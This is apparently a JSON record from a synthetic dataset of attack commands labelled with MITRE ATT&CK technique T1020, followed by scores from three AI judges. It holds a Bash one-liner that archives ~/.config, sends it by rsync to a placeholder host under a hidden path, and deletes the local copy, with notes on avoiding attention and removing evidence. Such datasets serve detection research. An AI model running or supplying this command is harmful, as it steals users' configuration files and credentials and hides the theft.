@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "tar czf /tmp/.cfg-$HOSTNAME.tgz -C $HOME .config 2>/dev/null && rsync -azq /tmp/.cfg-$HOSTNAME.tgz backup@cdn.example.net:.cache/.rs/ && rm -f /tmp/.cfg-$HOSTNAME.tgz",
+  "explanation": "Aggregates configuration data into a compressed archive and exfiltrates it via rsync in a single quiet transfer, then cleans up, supporting automated bulk exfiltration (T1020).",
+  "rationale_steps": [
+    "Package target data to minimize multiple transfers.",
+    "Suppress tar output to avoid attention.",
+    "Use rsync for a single quiet upload.",
+    "Remove local artifact to reduce evidence."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-b089ed8f",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with valid tar and rsync flags, proper && chaining, and correct stderr redirection without quoting or parsing issues.",
+        "semantic_score": 4,
+        "semantic_justification": "It archives ~/.config, quietly transfers the archive to a remote host via rsync, and deletes the local file—aligned with automated exfiltration behaviors—though it lacks explicit scheduling or retry logic.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:16:37.015607Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), valid flags for tar (-czf), rsync (-azq), and rm (-f), balanced quoting, and logical flow.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements automated exfiltration by compressing user configuration files (.config directory), transferring them via rsync to a remote server with obfuscated naming (.cfg-$HOSTNAME.tgz hidden in .cache/.rs/), and cleaning up traces afterward.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T02:16:40.198606Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses valid flags and separators, and adheres to standard Bash syntax without any errors or impossible constructs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by collecting and compressing configuration data, exfiltrating it via rsync to an external location, and cleaning up, which is operationally plausible and directly aligns with the T1020 automated exfiltration technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T02:16:50.940927Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
